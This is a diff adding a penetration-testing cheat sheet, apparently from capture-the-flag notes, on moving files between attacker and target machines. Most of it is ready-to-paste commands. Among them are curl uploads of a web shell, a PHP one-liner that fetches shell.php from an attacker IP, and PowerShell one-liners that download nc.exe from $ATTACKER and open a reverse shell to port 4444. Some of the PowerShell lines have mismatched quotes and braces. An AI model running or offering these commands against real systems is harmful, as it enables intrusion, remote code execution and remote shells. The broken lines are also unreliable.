@@ -1,0 +1,61 @@
+# Transfer Files
+
+# nc
+On the downloading machine run:
+nc -lvp 443 > transfer.txt
+
+On the uploading machine run:
+nc $ip 443 < transfer.txt
+
+# Upload (curl)
+curl --upload-file shell.php --url http://$ip/shell.php --http1.0
+
+# Download (curl)
+curl -O http://host/file
+
+## Small Executables/Files
+On local system:
+cat filetoupload | base64 -w 0; echo
+
+On Target System:
+echo <copiedContent> | base64 -d > filetoupload
+
+# Serve a Directory (Python2)
+python -m SimpleHTTPServer
+
+# Serve a directory (Python3)
+python -m http.server
+
+# Serve a directory (PHP)
+php -S $ip:80
+
+# Serve an FTP server
+pip install pyftpdlib
+python -m pyftpdlib -p 21
+
+# Serve an SMB server
+python smbserver.py WORKSPACE /dir
+smbserver.py devel /root/Desktop/htb/devel 
+
+# Setup an HTTP server supporting upload button
+wget https://gist.githubusercontent.com/UniIsland/3346170/raw/059aca1d510c615df3d9fedafabac4d538ebe352/SimpleHTTPServerWithUpload.py
+chmod +x SimpleHTTPServerWithUpload.py
+./SimpleHTTPServerWithUpload.py
+
+
+# Download a file (PHP)
+<?php file_put_contents("/var/tmp/shell.php", file_get_contents("http://10.11.0.245/shell.php")); ?>
+
+# Download a file (Python)
+python -c "from urllib import urlretrieve; urlretrieve('http://10.11.0.245/nc.exe', 'C:\\Temp\\nc.exe')"
+
+# Download a file (Powershell)
+powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); cmd /c nc.exe $ATTACKER 4444 -e cmd.exe" }
+
+powershell -Command "& {(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe'); Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
+
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/nc.exe','nc.exe')"; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'"
+
+powershell (New-Object System.Net.WebClient).DownloadFile('http://$ATTACKER/file.exe','file.exe');(New-Object -com Shell.Application).ShellExecute('file.exe');
+
+powershell -command { $b=New-Object System.Net.WebClient; $b.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; $b.DownloadString("http://$attacker/nc.exe") | Out-File nc.exe; Start-Process nc.exe -NoNewWindow -Argumentlist '$ATTACKER 4444 -e cmd.exe'" }
